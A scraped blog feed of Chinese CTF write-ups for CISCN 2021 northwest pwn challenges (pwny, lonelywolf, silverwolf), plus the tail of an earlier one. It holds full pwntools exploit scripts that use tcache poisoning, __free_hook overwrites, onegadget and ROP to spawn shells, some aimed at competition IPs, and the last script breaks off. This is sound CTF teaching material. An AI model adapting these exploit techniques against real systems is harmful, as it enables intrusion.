class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./pwn1&#x27;)</span><br><span class="line">io = remote(&#x27;172.1.28.7&#x27;,8888)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context(log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">def add(a1,a2,a3):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx: &#x27;,str(a1))</span><br><span class="line">    io.sendlineafter(&#x27;length: &#x27;,str(a2))</span><br><span class="line">    io.sendlineafter(&#x27;key: &#x27;,str(a3))</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx: &#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def encry(a1,a2):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx: &#x27;,str(a1))</span><br><span class="line">    io.sendafter(&#x27;content: &#x27;,a2)</span><br><span class="line"></span><br><span class="line">def decry(a1):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx: &#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def gift(a1,a2,a3):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;233&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx: &#x27;,str(a1))</span><br><span class="line">    io.sendlineafter(&#x27;length: &#x27;,str(a2))</span><br><span class="line">    io.sendlineafter(&#x27;key: &#x27;,str(a3))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0,0x108,0xb0)</span><br><span class="line">    add(1,0x108,0)</span><br><span class="line">    add(2,0x108,1)</span><br><span class="line">    payload = &#x27;a&#x27;*0x108</span><br><span class="line">    encry(0,payload)</span><br><span class="line">    payload = &#x27;a&#x27;*0x68+&#x27;\xa1&#x27;+&#x27;\x00&#x27;</span><br><span class="line">    encry(1,payload)</span><br><span class="line">    #pause()</span><br><span class="line">    dele(0)</span><br><span class="line">    dele(2)</span><br><span class="line">    dele(1)</span><br><span class="line">    gift(1,0x88,0)</span><br><span class="line">    #pause()</span><br><span class="line">    payload = &#x27;a&#x27;*0x28</span><br><span class="line">    encry(1,payload)</span><br><span class="line">    io.recvuntil(&#x27;61&#x27;*0x28)</span><br><span class="line">    heap_base = io.recv(12)</span><br><span class="line">    news=&#x27;&#x27;</span><br><span class="line">    while(len(heap_base)):</span><br><span class="line">        news += heap_base[-2:]</span><br><span class="line">        heap_base = heap_base[:-2]</span><br><span class="line">    heap_base = int(news,16)</span><br><span class="line">    print(hex(heap_base))</span><br><span class="line"></span><br><span class="line">    payload = &#x27;a&#x27;*0x18+p64(0x111)+p64(heap_base^heap_base&gt;&gt;12)</span><br><span class="line">    decry(1)</span><br><span class="line">    encry(1,payload)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0,0x108,0)</span><br><span class="line">    add(2,0x108,0)#tcache</span><br><span class="line">    #pause()</span><br><span class="line">    payload = &#x27;\x00&#x27;*0x1e+&#x27;\x07\x00&#x27;+&#x27;\x00&#x27;*0x60</span><br><span class="line">    encry(2,payload)</span><br><span class="line">    dele(0)</span><br><span class="line">    decry(2)</span><br><span class="line">    payload = &#x27;\x01&#x27;+&#x27;\x00&#x27;*0x7f</span><br><span class="line">    encry(2,payload)</span><br><span class="line">    decry(1)</span><br><span class="line">    encry(1,&#x27;a&#x27;*0x21)</span><br><span class="line">    decry(1)</span><br><span class="line">    io.recvuntil(&#x27;61&#x27;*0x21)</span><br><span class="line">    main_arena = io.recv(10)</span><br><span class="line">    news=&#x27;&#x27;</span><br><span class="line">    while(len(main_arena)):</span><br><span class="line">        news += main_arena[-2:]</span><br><span class="line">        main_arena = main_arena[:-2]</span><br><span class="line">    main_arena = int(news,16)</span><br><span class="line">    #print(hex(main_arena&lt;&lt;8))</span><br><span class="line">    main_arena = main_arena&lt;&lt;8</span><br><span class="line">    malloc_hook = main_arena-96-16</span><br><span class="line">    libcbase = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    system = libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    free_hook = libcbase+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    print(&#x27;free_hook&#x27;,hex(free_hook))</span><br><span class="line">    encry(1,&#x27;a&#x27;*0x18+p64(0x111)+&#x27;\x00&#x27;)</span><br><span class="line">    decry(1)</span><br><span class="line">    #pause()</span><br><span class="line"></span><br><span class="line">    add(0,0x108,0)</span><br><span class="line">    decry(2)</span><br><span class="line">    dele(0)</span><br><span class="line">    #pause()</span><br><span class="line">    encry(2,&#x27;\x01\x00&#x27;+&#x27;\x00&#x27;*0x1c+&#x27;\x01\x00&#x27;+&#x27;\x00&#x27;*0x60+p64(heap_base-0x10+0x2a0)+&#x27;\x00&#x27;*(0x100-0x90)+p64(free_hook-0x10))</span><br><span class="line">    #pause()</span><br><span class="line"></span><br><span class="line">    add(0,0x108,0)</span><br><span class="line">    encry(0,&#x27;/bin/sh\x00&#x27;*2+p64(system))</span><br><span class="line">    dele(0)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2021西北部分pwn</title>
      <link href="/2021/06/11/ciscn2021%E8%A5%BF%E5%8C%97%E9%83%A8%E5%88%86pwn/"/>
      <url>/2021/06/11/ciscn2021%E8%A5%BF%E5%8C%97%E9%83%A8%E5%88%86pwn/</url>
      
        <content type="html"><![CDATA[<p> <strong>ciscn2021西北部分pwn</strong></p><span id="more"></span><p><em>打了一天的国赛，发现自己还是太菜了</em></p><h3 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h3><p>读取随机数到bss段上作为文件描述符范围在0~0xff之间，又在自定义的函数sub_ba0中发现可以根据偏移进行任意写的操作，sub_b20可以根据偏移进行任意读操作，因此就可以覆盖fd的值，爆破fd使其等于0，我们就可以进行任意读写</p><p> <img src="https://img-blog.csdnimg.cn/20210516103321112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210516103321112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210516103433638.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210516103433638.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210516103442991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210516103442991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210516103517471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210516103517471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>我们可以通过泄露出bss段上的stdout指针指向的_IO_2_1_stdout_的地址来泄露libc的基地址，在通过泄露data段上的off_202008来泄露bss段上的地址，再通过libc上的environ来泄露栈地址。<br> <img src="https://img-blog.csdnimg.cn/20210516103539633.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210516103539633.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>因此就可以通过偏移将onegadget直接写入栈上的返回地址中，获得shell。</p><p><strong>用爆破调试有点麻烦，发现可以修改二进制程序，将fd直接改成0再进行调试。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">exp如下：</span><br><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwny&#x27;)</span><br><span class="line">#io=remote(&#x27;124.70.20.79&#x27;,22270)</span><br><span class="line">elf=ELF(&#x27;./pwny&#x27;)</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">    io.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">    io.send(&#x27;1 &#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Index: &#x27;)</span><br><span class="line"></span><br><span class="line">def write(a1):</span><br><span class="line">    io.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">    io.send(&#x27;2 &#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Index: &#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.send(str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    write(256)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    read()</span><br><span class="line">    #io.send(&#x27;-64\n&#x27;)</span><br><span class="line">    io.send(&#x27;\xF8\xFF\xFF\xFF\xFF\xFF\xFF\xff&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">    stdout=int(io.recv(12),16)</span><br><span class="line">    print(hex(stdout))</span><br><span class="line">    libcbase = stdout-libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    system=libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    stderr=libcbase+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]</span><br><span class="line">    binsh=libcbase+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">    environ=libcbase+libc.symbols[&#x27;_environ&#x27;]</span><br><span class="line">    onegadget=[0x4f3d5,0x4f432,0x10a41c]</span><br><span class="line">    #onegadget=[0x4f365,0x4f3c2,0x10a45c]</span><br><span class="line">    #offset=(environ-(bss_addr+0x60))//8</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    read()</span><br><span class="line">    io.send(&#x27;\xf5\xff\xff\xff\xff\xff\xff\xff&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">    bss_addr=int(io.recv(12),16)-8</span><br><span class="line">    print(hex(bss_addr))</span><br><span class="line"></span><br><span class="line">    read()</span><br><span class="line">    offset=(environ-(bss_addr+0x60))//8</span><br><span class="line">    io.send(p64(offset))</span><br><span class="line">    io.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">    stack=int(io.recv(12),16)</span><br><span class="line">    print(hex(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ret_addr=stack-0x120</span><br><span class="line">    offset=((ret_addr-(bss_addr+0x60))//8)</span><br><span class="line"></span><br><span class="line">    write(offset)</span><br><span class="line">    payload=p64(libcbase+onegadget[2])</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">    #io.sendline()</span><br><span class="line"></span><br><span class="line">#exp()</span><br><span class="line">i=0</span><br><span class="line">while(i!=100):</span><br><span class="line">    try:</span><br><span class="line">        #io=remote(&#x27;124.70.20.79&#x27;,22270)</span><br><span class="line">        io=process(&#x27;./pwny&#x27;)</span><br><span class="line">        i+=1</span><br><span class="line">        exp()</span><br><span class="line">    except:</span><br><span class="line">        i+=1</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h3 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h3><p>常规的菜单题<br>发现漏洞在dele中对free后的指针没有置0<br><img src="https://img-blog.csdnimg.cn/20210516103143646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210516103143646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>通过doublefree泄露heap_base控制fd指针来控制tcache_struct，将0x250对应的counts改为\xff在freetcache_struct来泄露libcbase的基地址，最后再通过doublefree修改fd指针为__free_hook-0x8(__free_hook-0x10前8个字节不知道为啥修改不了)，在__free_hook-0x8出填上/bin/sh\x00，在__free_hook填上system地址，dele（0）,拿到shell。但在打远程的时候，发现报出了doublefree漏洞，将第一次free后的tcache的fd和bk指针置0，在free就行了。</p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./lonelywolf&#x27;)</span><br><span class="line">io=remote(&#x27;124.70.20.79&#x27;,22175)</span><br><span class="line">#elf=ELF(&#x27;./lonelywolf&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc-2.271.so&#x27;)</span><br><span class="line">#context(log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">def add(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;1 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Size: &#x27;,str(a2)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;2 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,a2)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;4 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0,96)#0 0x60</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    #print(io.recv(6))</span><br><span class="line">    heapbase=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0x260</span><br><span class="line">    #heapbase=int(io.recv(14),16)</span><br><span class="line">    print(hex(heapbase))</span><br><span class="line">    edit(0,p64(heapbase+0x10))</span><br><span class="line">    add(0,96)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0,96)#tcache</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*0x20+&#x27;\xff&#x27;*0x8)</span><br><span class="line">    dele(0)</span><br><span class="line">    #pause()</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">    libcbase=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    free_hook=libcbase+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system=libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    add(0,120)#0x30</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*0x40)</span><br><span class="line">    #pause()</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(free_hook-0x8)+p64(0))</span><br><span class="line">    add(0,120)</span><br><span class="line">    add(0,120)</span><br><span class="line">    edit(0,&#x27;/bin/sh\x00&#x27;+p64(system))</span><br><span class="line">    pause()</span><br><span class="line">    dele(0)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h3><p>是个沙箱堆题，libc2.27，第一次做，发现程序逻辑和上个题一样，知识不能用system，但可以使用open、read、write。思路就是利用libc中的environ将chunk申请到栈上，再覆盖返回地址构造rop（这种思路实现起来有点困难，因为chunk可写的大小最大时0x78），但在调试时发现一进入open函数就报错，我猜测是因为libc中的open函数是open64，所以不能绕过沙箱，先放上我的错误exp（<strong>希望哪位大佬可以帮我调试下，帮帮我这个小菜鸡</strong>）（问题已解决，感谢  KANGEL12 师傅的提醒。），后续补上正确的exp。<br><img src="https://img-blog.csdnimg.cn/2021051610413850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/2021051610413850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./silverwolf&#x27;)</span><br><span class="line">#io=remote(&#x27;124.70.20.79&#x27;,22220)</span><br><span class="line">elf=ELF(&#x27;./silverwolf&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">#pop_rdi=0x215bf</span><br><span class="line">#pop_rsi=0x23ee</span><br><span class="line">#pop_rdx=0x1b96</span><br><span class="line">#pop_rdx_rsi=0x130569</span><br><span class="line"></span><br><span class="line">pop_rax=0x43a78</span><br><span class="line">pop_rdx_rsi=0x130889</span><br><span class="line">pop_rdi=0x2155f</span><br><span class="line">pop_rsi=0x23e8a</span><br><span class="line">pop_rdx=0x1b96</span><br><span class="line"></span><br><span class="line">def add(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;1 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Size: &#x27;,str(a2)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;2 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,a2)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;4 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0,80)#0 0x50</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    #print(io.recv(6))</span><br><span class="line">    heapbase=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0x1880</span><br><span class="line">    print(hex(heapbase))</span><br><span class="line">    edit(0,p64(heapbase+0x10))</span><br><span class="line">    add(0,80)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0,88)#tcache</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*6+&#x27;\x01&#x27;+&#x27;\x00&#x27;*(0x20-7)+&#x27;\xff&#x27;*0x8+&#x27;\x00&#x27;*0x2f)</span><br><span class="line">    add(0,120)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(heapbase+0x40))</span><br><span class="line">    add(0,120)</span><br><span class="line">    add(0,120)#tcache+0x40</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*0x70)</span><br><span class="line"></span><br><span class="line">    add(0,96)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(heapbase+0x10))</span><br><span class="line">    add(0,96)</span><br><span class="line">    add(0,96)#tcache</span><br><span class="line">    #pause()</span><br><span class="line"></span><br><span class="line">    dele(0)</span><br><span class="line">    